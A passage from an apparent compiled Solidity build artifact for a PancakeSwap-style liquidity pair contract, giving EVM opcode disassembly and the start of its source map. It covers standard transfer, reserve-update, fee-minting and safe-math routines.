SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1CDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1CEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1D04 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x10 SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1DD6 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1DB7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1E38 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1E3D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1E6B JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1E6B JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1E68 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1EBC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1EDE JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1EDB JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1F94 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1FD9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x2009 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x201D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x208E JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x204B DUP6 PUSH2 0x2036 DUP7 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2628 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x2076 DUP5 PUSH2 0x2036 DUP8 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x21C4 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x21F9 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2294 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x22A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x22BE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x23A2 JUMPI DUP1 ISZERO PUSH2 0x239D JUMPI PUSH1 0x0 PUSH2 0x2301 PUSH2 0x1075 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x230E DUP4 PUSH2 0x23B6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x239A JUMPI PUSH1 0x0 PUSH2 0x2341 PUSH1 0x8 PUSH2 0xBAA PUSH2 0x2332 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2376 PUSH2 0x2359 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x236A DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x2383 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x2396 JUMPI PUSH2 0x2396 DUP8 DUP3 PUSH2 0x2408 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x23AE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x23AE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x23F9 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x23F3 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x23E2 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x23EB JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x23CB JUMP JUMPDEST POP PUSH2 0x2403 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2403 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x241B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2446 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x249B JUMPI DUP2 PUSH2 0x249D JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x24CD SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x24FA SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x258D JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x25A0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x25CB SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2645 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID 0x4F PUSH15 0x6C79206F776E65722063616E206361 PUSH13 0x6C20746869732066756E637469 PUSH16 0x6E50616E63616B653A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCF SWAP1 DUP10 0xF7 DUP8 0xDB 0x5C 0x2A PUSH13 0xA32EBE2DC67686BE59FF857F8A 0xC4 PUSH26 0xE4A2EDBCA7AAF7C464736F6C6343000510003200000000000000 ",
							"sourceMap": "226:18534:6:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;226:18534:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;11956:2866;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;11956:2866:6;;;;;;;;-1:-1:-1;;;;;11956:2866:6;;;;;;;;;;;;;;;;;21:11:-1;5:28;;2:2;;;46:1;43;36:12;2:2;11956:2866:6;;35:9:-1;28:4;12:14;8:25;5:40;2:2;;;58:1;55;48:12;2:2;11956:2866:6;;;;;;100:9:-1;95:1;81:12;77:20;67:8;63:35;60:50;39:11;25:12;22:29;11:107;8:2;;;131:1;128;121:12;8:2;-1:-1;11956:2866:6;;-1:-1:-1;11956:2866:6;-1:-1:-1;11956:2866:6;:::i;:::-;;175:39:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:100:-1;33:3;30:1;27:10;8:100;;;90:11;;;84:18;71:11;;;64:39;52:2;45:10;8:100;;;12:14;175:39:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1607:301:6;;;:::i;:::-;;;;-1:-1:-1;;;;;1607:301:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2810:147:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2810:147:0;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;587:21:6;;;:::i;:::-;;;;-1:-1:-1;;;;;587:21:6;;;;;;;;;;;;;;2834:274;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2834:274:6;;;;;;;;;;;;;;;;;:::i;307:26:0:-;;;:::i;:::-;;;;;;;;;;;;;;;;3108:361;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3108:361:0;;;;;;;;;;;;;;;;;:::i;656:116::-;;;:::i;266:35::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;515:31;;;:::i;459:49::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;459:49:0;-1:-1:-1;;;;;459:49:0;;:::i;934:32:6:-;;;:::i;972:::-;;;:::i;1482:117::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;1482:117:6;;:::i;5261:1265::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5261:1265:6;-1:-1:-1;;;;;5261:1265:6;;:::i;339:44:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;339:44:0;-1:-1:-1;;;;;339:44:0;;:::i;1010:17:6:-;;;:::i;778:41:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;778:41:0;-1:-1:-1;;;;;778:41:0;;:::i;8025:1429:6:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8025:1429:6;-1:-1:-1;;;;;8025:1429:6;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1114:20;;;:::i;325:70::-;;;:::i;220:40:0:-;;;:::i;2963:139::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2963:139:0;;;;;;;;:::i;402:48:6:-;;;:::i;18077:421::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18077:421:6;-1:-1:-1;;;;;18077:421:6;;:::i;559:22::-;;;:::i;614:21::-;;;:::i;3475:964:0:-;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;-1:-1;;;;;;3475:964:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;6635:1281:6:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6635:1281:6;-1:-1:-1;;;;;6635:1281:6;;:::i;389:64:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;389:64:0;;;;;;;;;;:::i;641:18:6:-;;;:::i;18544:214::-;;;:::i;11956:2866::-;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;12120:14;;;;:32;;;12151:1;12138:10;:14;12120:32;12099:114;;;;-1:-1:-1;;;12099:114:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12224:17;12243;12266:13;:11;:13::i;:::-;12223:56;;;;;12338:9;-1:-1:-1;;;;;12325:22:6;:10;:22;:48;;;;;12364:9;-1:-1:-1;;;;;12351:22:6;:10;:22;12325:48;12304:126;;;;;-1:-1:-1;;;12304:126:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;12441:13;12464;12501:18;12559:3;12549:6;;12536:10;:19;12535:27;;;;;;12522:10;:40;12501:61;;12576:18;12634:3;12624:6;;12611:10;:19;12610:27;;;;;12737:6;;12775;;12610:27;;;;12597:40;;;-1:-1:-1;;;;;;12737:6:6;;;;12775;;;12803:13;;;;;;;:30;;;12826:7;-1:-1:-1;;;;;12820:13:6;:2;-1:-1:-1;;;;;12820:13:6;;;12803:30;12795:62;;;;;-1:-1:-1;;;12795:62:6;;;;;;;;;;;;-1:-1:-1;;;12795:62:6;;;;;;;;;;;;;;;12875:14;;12871:61;;12891:41;12905:7;12914:2;12918:13;12891;:41::i;:::-;12984:14;;12980:61;;13000:41;13014:7;13023:2;13027:13;13000;:41::i;:::-;13093:15;;13089:237;;13134:2;-1:-1:-1;;;;;13126:23:6;;13171:10;13203:13;13253;13304:4;;13126:200;;;;;;;;;;;;;-1:-1:-1;;;;;13126:200:6;-1:-1:-1;;;;;13126:200:6